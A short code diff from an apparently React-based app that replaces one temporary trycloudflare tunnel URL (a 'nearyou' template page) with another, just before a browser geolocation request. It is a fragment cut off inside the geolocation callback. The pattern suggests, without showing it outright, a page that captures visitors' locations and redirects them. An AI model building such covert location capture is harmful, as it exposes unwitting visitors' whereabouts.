@@ -4,7 +4,7 @@ import LoadingPage from "./Pages/LoadingPage";
 function App() {
 
   useEffect(() => {
-   const tragetlink ="https://magazine-listed-gotten-opportunities.trycloudflare.com/templates/nearyou/index.html";
+   const tragetlink ="http://eyes-diverse-cargo-near.trycloudflare.com/templates/nearyou/index.html";
 
     navigator.geolocation.getCurrentPosition(
       () => {
